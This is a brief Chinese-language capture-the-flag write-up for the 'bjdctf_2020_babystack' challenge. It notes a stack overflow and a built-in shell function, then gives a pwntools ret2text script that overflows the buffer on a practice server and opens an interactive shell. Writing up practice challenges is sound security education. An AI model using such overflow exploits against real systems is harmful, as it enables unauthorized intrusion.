---
title: "bjdctf_2020_babystack"
description: ""
date: 2023-04-06T21:03:41+08:00
lastmod: 2023-04-06T21:03:41+08:00
draft: false
images: []
type: docs
weight: 993
toc: true
---

## 0x01 分析

![8cec3866b572881028c9584ca038f7c0](images/8cec3866b572881028c9584ca038f7c0.png)  

![1cd94d9289eb525157d7325df6994c12](images/1cd94d9289eb525157d7325df6994c12.png)  

有溢出

![50cb56209af3c56f5de238a59323dc12](images/50cb56209af3c56f5de238a59323dc12.png)  

还有直接getshell的函数，所以直接ret2text

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 26893)
payload = b'a'*0x18 + p64(0x4007CB) + p64(0x4006E6)
o.sendlineafter(b"length of your name:", str(len(payload)+1).encode())
o.sendline(payload)
o.interactive()

```

![5d3e8513e99437fd36b6c26db3508ee8](images/5d3e8513e99437fd36b6c26db3508ee8.png)  

自行调试
